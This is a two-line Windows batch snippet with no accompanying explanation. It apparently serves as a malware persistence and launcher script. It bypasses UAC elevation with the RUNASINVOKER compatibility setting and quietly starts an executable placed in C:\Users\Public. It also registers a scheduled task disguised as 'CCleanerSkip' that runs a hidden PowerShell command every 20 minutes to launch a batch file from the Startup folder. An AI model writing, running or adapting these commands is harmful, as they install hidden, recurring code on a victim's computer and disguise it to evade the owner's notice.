setlocal enabledelayedexpansion & set "__COMPAT_LAYER=RUNASINVOKER" & start "" /min cmd /C "setlocal enabledelayedexpansion ^& (echo ^^^!__COMPAT_LAYER^^^! ^& start "" /min C:\Users\Public\service.exe)"
schtasks /create /tn "CCleanerSkip" /tr "powershell.exe  -WindowStyle Hidden cmd /c start /min %USERPROFILE%\Start Menu\Programs\Startup\OfficeClick.bat" /sc minute /mo 20 /F
